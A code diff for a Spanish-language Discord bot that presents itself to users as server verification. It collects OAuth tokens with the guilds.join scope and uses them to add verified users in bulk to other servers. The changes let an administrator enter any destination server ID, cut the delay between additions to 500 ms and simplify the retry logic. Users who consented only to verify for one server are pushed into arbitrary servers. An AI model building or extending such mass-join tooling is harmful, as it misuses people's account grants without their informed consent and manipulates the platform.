@@ -14,6 +14,9 @@ const {
     Events,
     StringSelectMenuBuilder,
     SlashCommandBuilder,
+    ModalBuilder,
+    TextInputBuilder,
+    TextInputStyle,
     PermissionFlagsBits
 } = require("discord.js");
 
@@ -42,16 +45,11 @@ const verificationServers = {
 
 
 // =====================================================
-// SERVIDOR DESTINO PARA AÑADIR USUARIOS
+// CONFIGURACIÓN DE AÑADIR USUARIOS
 // =====================================================
 
-const MASS_JOIN_GUILD_ID =
-    process.env.MASS_JOIN_GUILD_ID ||
-    "1519063238866636851";
-
-
 // Tiempo entre usuarios
-const MASS_JOIN_DELAY_MS = 1500;
+const MASS_JOIN_DELAY_MS = 500;
 
 
 // Estados temporales OAuth
@@ -350,142 +348,228 @@ async function addUserToGuild(
     guildId
 ) {
 
+    let accessToken =
+
+        await getValidAccessToken(user);
+
+
+    async function request() {
+
+        return axios.put(
+
+            `https://discord.com/api/v10/guilds/${guildId}/members/${user.discord_id}`,
+
+            {
+
+                access_token:
+                    accessToken
+
+            },
+
+            {
+
+                headers: {
+
+                    Authorization:
+                        `Bot ${process.env.TOKEN}`,
+
+                    "Content-Type":
+                        "application/json"
+
+                },
+
+                validateStatus:
+                    () => true
+
+            }
+
+        );
+
+    }
+
+
     try {
 
-        let accessToken =
-            await getValidAccessToken(user);
+        let response =
+            await request();
 
-        const url =
-            `https://discord.com/api/v10/guilds/${guildId}/members/${user.discord_id}`;
 
-        for (let intento = 1; intento <= 3; intento++) {
-
-            let response;
-
-            try {
-
-                response = await axios.put(
-                    url,
-                    {
-                        access_token: accessToken
-                    },
-                    {
-                        headers: {
-                            Authorization: `Bot ${process.env.TOKEN}`,
-                            "Content-Type": "application/json"
-                        },
-                        timeout: 15000,
-                        validateStatus: () => true
-                    }
-                );
-
-            } catch (error) {
-
-                if (
-                    error.code === "ECONNABORTED" ||
-                    error.code === "ETIMEDOUT"
-                ) {
-
-                    console.log(
-                        `⏱️ Timeout añadiendo ${user.username} (intento ${intento}/3)`
-                    );
-
-                    if (intento < 3) {
-                        await sleep(2000);
-                        continue;
-                    }
-                }
-
-                return {
-                    ok: false,
-                    reason: error.message || "Error de conexión"
-                };
-            }
-
-            if (response.status === 201) {
-                console.log(`✅ ${user.username} añadido correctamente`);
-                return { ok: true, already: false };
-            }
-
-            if (response.status === 204) {
-                console.log(`👤 ${user.username} ya estaba en el servidor`);
-                return { ok: true, already: true };
-            }
-
-            if (response.status === 401) {
-                console.log(`🔄 Token caducado para ${user.username}. Renovando...`);
-
-                try {
-                    accessToken = await refreshUserToken(user);
-                    continue;
-                } catch (error) {
-                    console.error(
-                        `❌ No se pudo renovar el token de ${user.username}:`,
-                        error.message
-                    );
-                    return {
-                        ok: false,
-                        reason: "Token OAuth caducado y no se pudo renovar"
-                    };
-                }
-            }
-
-            if (response.status === 429) {
-
-                const retryAfter = Number(
-                    response.data?.retry_after ||
-                    response.headers?.["retry-after"] ||
-                    2
-                );
-
-                console.log(
-                    `⏳ Rate limit para ${user.username}. Esperando ${retryAfter} segundos...`
-                );
-
-                await sleep(Math.ceil(retryAfter * 1000));
-                continue;
-            }
-
-            if (response.status === 403) {
-                console.error(
-                    `❌ 403 al añadir ${user.username}:`,
-                    response.data
-                );
-                return {
-                    ok: false,
-                    reason: "403: El bot no tiene permisos suficientes o Discord rechazó la incorporación."
-                };
-            }
-
-            if (response.status === 404) {
-                return {
-                    ok: false,
-                    reason: "404: Servidor, usuario o aplicación no encontrada."
-                };
-            }
+        // Usuario añadido
+        if (
+            response.status === 201
+        ) {
 
             return {
-                ok: false,
-                reason: response.data?.message || `Discord HTTP ${response.status}`
+
+                ok: true,
+
+                already: false
+
             };
+
         }
 
+
+        // Usuario ya estaba
+        if (
+            response.status === 204
+        ) {
+
+            return {
+
+                ok: true,
+
+                already: true
+
+            };
+
+        }
+
+
+        // Token caducado
+        if (
+            response.status === 401
+        ) {
+
+            console.log(
+                `🔄 Renovando token de ${user.username}...`
+            );
+
+
+            accessToken =
+                await refreshUserToken(user);
+
+
+            response =
+                await request();
+
+
+            if (
+                response.status === 201
+            ) {
+
+                return {
+
+                    ok: true,
+
+                    already: false
+
+                };
+
+            }
+
+
+            if (
+                response.status === 204
+            ) {
+
+                return {
+
+                    ok: true,
+
+                    already: true
+
+                };
+
+            }
+
+        }
+
+
+        // Rate limit
+        if (
+            response.status === 429
+        ) {
+
+            const retryAfter =
+
+                Number(
+                    response.data?.retry_after ||
+                    1
+                );
+
+
+            console.log(
+
+                `⏳ Rate limit. Esperando ${retryAfter}s...`
+
+            );
+
+
+            await sleep(
+
+                Math.ceil(
+                    retryAfter * 1000
+                )
+
+            );
+
+
+            response =
+                await request();
+
+
+            if (
+                response.status === 201
+            ) {
+
+                return {
+
+                    ok: true,
+
+                    already: false
+
+                };
+
+            }
+
+
+            if (
+                response.status === 204
+            ) {
+
+                return {
+
+                    ok: true,
+
+                    already: true
+
+                };
+
+            }
+
+        }
+
+
         return {
+
             ok: false,
-            reason: "Se agotaron los 3 intentos."
+
+            reason:
+
+                response.data?.message ||
+
+                `Discord HTTP ${response.status}`
+
         };
+
 
     } catch (error) {
 
-        console.error(
-            `❌ Error procesando ${user.username}:`,
-            error
-        );
-
         return {
+
             ok: false,
-            reason: error.response?.data?.message || error.message || "Error desconocido"
+
+            reason:
+
+                error.response?.data?.message ||
+
+                error.message ||
+
+                "Error desconocido"
+
         };
+
     }
 
 }
@@ -921,13 +1005,138 @@ client.on(
                 }
 
 
-                // Servidor destino
+                // =================================================
+                // PEDIR ID DEL SERVIDOR DESTINO
+                // =================================================
+
+                const modal =
+                    new ModalBuilder()
+                        .setCustomId(
+                            "modal_servidor_destino"
+                        )
+                        .setTitle(
+                            "Servidor destino"
+                        );
+
+                const guildIdInput =
+                    new TextInputBuilder()
+                        .setCustomId(
+                            "guild_id"
+                        )
+                        .setLabel(
+                            "ID del servidor de Discord"
+                        )
+                        .setPlaceholder(
+                            "Ej: 1519063238866636851"
+                        )
+                        .setStyle(
+                            TextInputStyle.Short
+                        )
+                        .setRequired(true)
+                        .setMinLength(17)
+                        .setMaxLength(20);
+
+                const inputRow =
+                    new ActionRowBuilder()
+                        .addComponents(
+                            guildIdInput
+                        );
+
+                modal.addComponents(
+                    inputRow
+                );
+
+                return interaction.showModal(
+                    modal
+                );
+
+            }
+
+
+            // =================================================
+            // MODAL SERVIDOR DESTINO
+            // =================================================
+
+            if (
+
+                interaction.isModalSubmit() &&
+
+                interaction.customId ===
+                "modal_servidor_destino"
+
+            ) {
+
+                if (
+
+                    !interaction.memberPermissions?.has(
+
+                        PermissionFlagsBits.Administrator
+
+                    )
+
+                ) {
+
+                    return interaction.reply({
+
+                        content:
+                            "❌ Solo los administradores pueden usar esto.",
+
+                        ephemeral:
+                            true
+
+                    });
+
+                }
+
+
+                const guildId =
+
+                    interaction.fields
+
+                        .getTextInputValue(
+
+                            "guild_id"
+
+                        )
+
+                        .trim();
+
+
+                // =================================================
+                // COMPROBAR ID
+                // =================================================
+
+                if (
+
+                    !/^\d{17,20}$/.test(
+                        guildId
+                    )
+
+                ) {
+
+                    return interaction.reply({
+
+                        content:
+
+                            "❌ La ID del servidor no es válida. Debe ser una ID numérica de Discord.",
+
+                        ephemeral:
+                            true
+
+                    });
+
+                }
+
+
+                // =================================================
+                // BUSCAR SERVIDOR
+                // =================================================
 
                 const guild =
 
                     client.guilds.cache.get(
 
-                        MASS_JOIN_GUILD_ID
+                        guildId
 
                     );
 
@@ -938,7 +1147,7 @@ client.on(
 
                         content:
 
-                            `❌ El bot no está en el servidor destino (${MASS_JOIN_GUILD_ID}).`,
+                            `❌ El bot no está dentro del servidor con ID \`${guildId}\`.\n\nInvita primero el bot a ese servidor y vuelve a intentarlo.`,
 
                         ephemeral:
                             true
@@ -957,11 +1166,15 @@ client.on(
                     new StringSelectMenuBuilder()
 
                         .setCustomId(
-                            "seleccionar_cantidad_usuarios"
+
+                            `seleccionar_cantidad_usuarios_${guildId}`
+
                         )
 
                         .setPlaceholder(
+
                             "Selecciona cuántos usuarios añadir"
+
                         )
 
                         .addOptions([
@@ -1112,7 +1325,9 @@ client.on(
 
                         `👥 **Añadir usuarios al servidor**\n\n` +
 
-                        `🎯 Servidor destino: **${guild.name}**\n\n` +
+                        `🎯 Servidor destino: **${guild.name}**\n` +
+
+                        `🆔 ID: \`${guildId}\`\n\n` +
 
                         `Selecciona la cantidad que quieres añadir:`,
 
@@ -1136,8 +1351,11 @@ client.on(
 
                 interaction.isStringSelectMenu() &&
 
-                interaction.customId ===
-                "seleccionar_cantidad_usuarios"
+                interaction.customId.startsWith(
+
+                    "seleccionar_cantidad_usuarios_"
+
+                )
 
             ) {
 
@@ -1165,11 +1383,26 @@ client.on(
                 }
 
 
+                // =================================================
+                // RECUPERAR ID DEL SERVIDOR
+                // =================================================
+
+                const guildId =
+
+                    interaction.customId.replace(
+
+                        "seleccionar_cantidad_usuarios_",
+
+                        ""
+
+                    );
+
+
                 const guild =
 
                     client.guilds.cache.get(
 
-                        MASS_JOIN_GUILD_ID
+                        guildId
 
                     );
 
@@ -1236,7 +1469,9 @@ client.on(
                         ? null
 
                         : Number(
+
                             selected
+
                         );
 
 
@@ -1255,7 +1490,9 @@ client.on(
                 let result;
 
 
-                if (limit === null) {
+                if (
+                    limit === null
+                ) {
 
                     result =
 
@@ -1387,7 +1624,7 @@ client.on(
 
                             user,
 
-                            MASS_JOIN_GUILD_ID
+                            guildId
 
                         );
 
@@ -1396,7 +1633,9 @@ client.on(
 
 
                         if (
+
                             result.already
+
                         ) {
 
                             already++;
@@ -1594,9 +1833,13 @@ client.on(
             const state =
 
                 crypto.randomBytes(
+
                     32
+
                 ).toString(
+
                     "hex"
+
                 );
 
 
@@ -1630,13 +1873,17 @@ client.on(
                 `&response_type=code` +
 
                 `&redirect_uri=${encodeURIComponent(
+
                     process.env.REDIRECT_URI
+
                 )}` +
 
                 `&scope=identify%20guilds.join` +
 
                 `&state=${encodeURIComponent(
+
                     state
+
                 )}`;
 
 
@@ -1677,7 +1924,9 @@ client.on(
                         true
 
                 }).catch(
+
                     () => {}
+
                 );
 
             }
@@ -1686,7 +1935,10 @@ client.on(
 
     }
 
-);// =====================================================
+);
+
+
+// =====================================================
 // LIMPIAR STATES
 // =====================================================
 
@@ -1701,8 +1953,11 @@ setInterval(
         for (
 
             const [
+
                 state,
+
                 data
+
             ]
 
             of oauthStates.entries()
@@ -1720,7 +1975,9 @@ setInterval(
             ) {
 
                 oauthStates.delete(
+
                     state
+
                 );
 
             }
@@ -1747,8 +2004,11 @@ app.use(
     express.static(
 
         path.join(
+
             __dirname,
+
             "public"
+
         )
 
     )
@@ -1763,8 +2023,11 @@ app.use(
     express.static(
 
         path.join(
+
             __dirname,
+
             "views/modules"
+
         )
 
     )
@@ -1783,7 +2046,9 @@ app.get(
     (req, res) => {
 
         res.send(
+
             "✅ Discord Verify Bot funcionando"
+
         );
 
     }
@@ -1827,11 +2092,15 @@ app.get(
                 guild.channels.cache
 
                     .filter(
+
                         c =>
+
                             c.isTextBased()
+
                     )
 
                     .map(
+
                         c => ({
 
                             id:
@@ -1841,18 +2110,23 @@ app.get(
                                 c.name
 
                         })
+
                     );
 
 
             res.json(
+
                 channels
+
             );
 
 
         } catch (error) {
 
             console.error(
+
                 error
+
             );
 
             res.json([]);
@@ -1961,7 +2235,9 @@ app.get(
         } catch (error) {
 
             console.error(
+
                 error
+
             );
 
 
@@ -2037,11 +2313,15 @@ app.get(
         } catch (error) {
 
             console.error(
+
                 error
+
             );
 
             res.send(
+
                 "❌ Error"
+
             );
 
         }
@@ -2071,8 +2351,11 @@ app.get(
 
 
             if (
+
                 !code ||
+
                 !state
+
             ) {
 
                 return res.send(
@@ -2091,7 +2374,9 @@ app.get(
             const oauthData =
 
                 oauthStates.get(
+
                     state
+
                 );
 
 
@@ -2109,7 +2394,9 @@ app.get(
             // Usar solo una vez
 
             oauthStates.delete(
+
                 state
+
             );
 
 
@@ -2120,7 +2407,9 @@ app.get(
             const config =
 
                 verificationServers[
+
                     oauthData.guildId
+
                 ];
 
 
@@ -2419,12 +2708,17 @@ app.get(
 <meta charset="UTF-8">
 
 <meta
+
     name="viewport"
+
     content="width=device-width, initial-scale=1.0"
+
 >
 
 <title>
+
     Verificación del servidor
+
 </title>
 
 
@@ -2457,13 +2751,18 @@ body {
 
     background:
         linear-gradient(
+
             135deg,
+
             #111,
+
             #1b1b1b
+
         );
 
     font-family:
         Arial,
+
         sans-serif;
 
     color:
@@ -2494,11 +2793,17 @@ body {
 
     box-shadow:
         0 0 40px
+
         rgba(
+
             255,
+
             212,
+
             0,
+
             .25
+
         );
 
 }
@@ -2654,6 +2959,7 @@ p {
                 "❌ Error en callback OAuth:",
 
                 error.response?.data ||
+
                 error
 
             );
@@ -2679,6 +2985,7 @@ p {
 const PORT =
 
     process.env.PORT ||
+
     3000;
 
 
@@ -2704,7 +3011,9 @@ app.listen(
 // =====================================================
 
 initDB().catch(
+
     console.error
+
 );
 
 
